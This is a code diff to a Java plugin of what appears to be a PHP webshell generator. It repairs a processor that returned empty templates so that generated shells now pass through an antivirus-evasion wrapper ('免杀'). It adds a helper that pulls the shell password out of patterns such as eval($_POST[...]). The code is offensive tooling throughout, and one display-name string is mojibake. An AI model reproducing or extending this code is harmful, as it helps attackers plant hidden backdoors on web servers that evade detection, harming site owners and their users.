@@ -17,7 +17,7 @@ import util.Log;
 import util.functions;
 
 @GenerateProcessor(
-    DisplayName = "PHP ȫ�汾�����ļ�������include_once��",
+    DisplayName = "PHP ȫ�汾�����ļ�������include_once��",
     superTemplate = {"php"}
 )
 public class PhpConstInclude implements ShellProcessor {
@@ -85,11 +85,45 @@ public class PhpConstInclude implements ShellProcessor {
         return data;
     }
 
+    /**
+     * 框架只调用 2 参数重载。旧实现直接返回 new byte[0]，导致生成模板 0KB。
+     * 密码已在 GenerateShellLoder 阶段写入 shell 正文，这里解析后走真正的免杀包装。
+     */
     public byte[] doProcessor(byte[] shell, String suffix) {
-        return new byte[0];
+        if (shell == null || shell.length == 0) {
+            return shell == null ? new byte[0] : shell;
+        }
+        String content = new String(shell);
+        String pass = extractPass(content);
+        return BypassReplace(content, pass).getBytes();
     }
 
     public byte[] doProcessor(byte[] shell, String suffix, String pass) {
-        return BypassReplace(new String(shell), pass).getBytes();
+        if (shell == null || shell.length == 0) {
+            return shell == null ? new byte[0] : shell;
+        }
+        return BypassReplace(new String(shell), pass == null ? "" : pass).getBytes();
+    }
+
+    /** 从已替换 {pass} 的 PHP 模板中提取密码。 */
+    static String extractPass(String shellContent) {
+        if (shellContent == null || shellContent.isEmpty()) {
+            return "";
+        }
+        // $pass='xxx';  /  $pass = "xxx";
+        java.util.regex.Matcher m = java.util.regex.Pattern
+                .compile("\\$pass\\s*=\\s*['\"]([^'\"]*)['\"]")
+                .matcher(shellContent);
+        if (m.find()) {
+            return m.group(1);
+        }
+        // eval($_POST["xxx"]) / $_POST['xxx']
+        m = java.util.regex.Pattern
+                .compile("\\$_POST\\s*\\[\\s*['\"]([^'\"]*)['\"]\\s*\\]")
+                .matcher(shellContent);
+        if (m.find()) {
+            return m.group(1);
+        }
+        return "";
     }
 }
